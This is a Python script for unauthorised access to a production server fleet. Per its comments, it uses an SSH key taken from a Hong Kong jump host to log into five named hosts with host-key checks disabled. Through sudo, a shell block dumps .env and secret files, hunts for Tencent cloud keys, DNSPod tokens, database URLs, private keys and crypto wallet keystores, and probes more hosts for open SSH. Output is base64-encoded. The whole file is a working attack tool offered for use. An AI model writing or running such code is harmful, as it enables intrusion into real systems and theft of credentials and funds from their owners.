# -*- coding: utf-8 -*-
# intent 29489 round B: hk (101.32.60.77) jump-host key /home/ubuntu/.ssh/id_ed25519 logs into the whole
# Tencent production fleet as ubuntu. Harvest the 5 reachable hosts (share-center/prod-agent/LLM/golden-stage/wu-ji-lian)
# with root, dump real env/secrets, grep zoofi/EVM/DNSPod/Tencent.
import json,os,sys,base64,re,subprocess,time
from concurrent.futures import ThreadPoolExecutor
HERE=os.path.dirname(os.path.abspath(__file__))
WORK="/tmp/p29489b"; os.makedirs(WORK,exist_ok=True)
KEYB64=open(os.path.join(HERE,"key_hk.b64")).read().strip()
open(WORK+"/fleetkey","wb").write(base64.b64decode(KEYB64)); os.chmod(WORK+"/fleetkey",0o600)

def R(k,v,maxb=60000):
    try: s=json.dumps(v,ensure_ascii=False) if not isinstance(v,str) else v
    except Exception: s=repr(v)
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
def run(cmd,timeout=300,stdin=None):
    try:
        p=subprocess.run(cmd,input=stdin,capture_output=True,timeout=timeout)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)

HARVEST=r'''
echo "@@@ID"; id; hostname; sudo -n id 2>&1 | head -1
echo "@@@NET"; ip -4 addr 2>/dev/null | grep -E "inet "; echo "--route"; ip route 2>/dev/null | head -8; echo "--hosts"; cat /etc/hosts 2>/dev/null
echo "@@@SVC"; sudo bash -c 'ls -la /opt 2>/dev/null; echo "--units"; ls /etc/systemd/system/ 2>/dev/null | grep -vE "\.wants|multi-user|getty" | head -40; echo "--envfiles"; grep -rhs "EnvironmentFile" /etc/systemd/system/ 2>/dev/null | sed "s/.*=//" | sort -u | head -20'
echo "@@@DOTENV"; sudo bash -c 'for f in $(find /opt /etc /home /root /srv /var/www -maxdepth 5 -type f \( -name ".env" -o -name ".env.*" -o -name "*.env" -o -name "cloud.env" -o -name "*secret*" -o -name "*.credentials" \) 2>/dev/null | grep -vE "node_modules|\.example|\.sample|\.tmpl|\.template|/\.git/" | head -40); do echo "== $f ($(wc -c <$f 2>/dev/null)b)"; if [ $(wc -c <$f 2>/dev/null) -le 7000 ]; then sed -E "s/^(.{0,400}).*/\1/" "$f" 2>/dev/null; else grep -aiE "zoofi|0xC56f|0xFE18|JWT_SECRET|DATABASE_URL|postgres://|mysql://|redis://|TENCENT|dnspod|LTAI|AKID|AKIA|SECRET_ID|SECRET_KEY|PASSWORD|TOKEN|PRIVATE_KEY|BEGIN " "$f" 2>/dev/null | head -50; fi; done'
echo "@@@TENCTX"; timeout 70 sudo grep -rhaE "TENCENTCLOUD_SECRET_ID|TENCENTCLOUD_SECRET_KEY|DNSPOD_TOKEN|DNSPOD_SECRET|DP_TOKEN|TENCENT_SECRET" /opt /etc /home /root /srv 2>/dev/null | grep -vE "example|sample|\.md:" | head -25
echo "@@@ZOOFI"; timeout 90 sudo grep -rlasE "zoofi|0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|keystore|cipherparams|scrypt|BIP39" --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=.cache /opt /etc /home /root /srv /var/www 2>/dev/null | head -60
echo "@@@REACH"; for h in 43.143.107.214 81.68.254.22 43.142.238.91 1.14.34.31 129.211.0.26 122.51.1.87 124.223.170.146 43.134.173.45; do (timeout 4 bash -c "echo > /dev/tcp/$h/22" 2>/dev/null && echo "TCP $h:22 OPEN") || echo "TCP $h:22 BLOCKED"; done
echo "@@@END"
'''

TARGETS=[("43.143.107.214","share-center"),("129.211.0.26","prod-agent"),
         ("81.68.254.22","LLM"),("43.142.238.91","golden-stage"),("1.14.34.31","wu-ji-lian")]

def ssh_target(host,user,cmd,tmo=280,proxy=False):
    a=["ssh","-i",WORK+"/fleetkey","-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null",
       "-o","ConnectTimeout=10","-o","IdentitiesOnly=yes","-o","PreferredAuthentications=publickey"]
    if proxy: a+=["-o","ProxyJump=ubuntu@101.32.60.77"]
    a+=["%s@%s"%(user,host),cmd]
    return run(a,timeout=tmo)

def do(idx,host,label):
    for proxy in (False,True):
        rc,o,e=ssh_target(host,"ubuntu",HARVEST,proxy=proxy)
        ok=("@@@ID" in o) and ("uid=" in o)
        R("t%d_%s_%s"%(idx,label,'p' if proxy else 'd'),{"rc":rc,"ok":ok,"err":e[-160:],"outlen":len(o)})
        if ok:
            parts=re.split(r'@@@([A-Z0-9_]+)',o)
            for i in range(1,len(parts),2):
                R("t%d_%s"%(idx,parts[i].lower()),parts[i+1] if i+1<len(parts) else "",maxb=70000)
            return {"idx":idx,"host":host,"label":label,"win":True,"proxy":proxy}
    return {"idx":idx,"host":host,"label":label,"win":False}

RESULTS=[]
try:
    with ThreadPoolExecutor(max_workers=5) as ex:
        futs=[ex.submit(do,i,h,l) for i,(h,l) in enumerate(TARGETS)]
        for f in futs:
            try: RESULTS.append(f.result())
            except Exception as e: R("t_exc",repr(e))
except Exception as e: R("top_exc",repr(e))
R("summary",RESULTS)
R("done",{"t":int(time.time())})
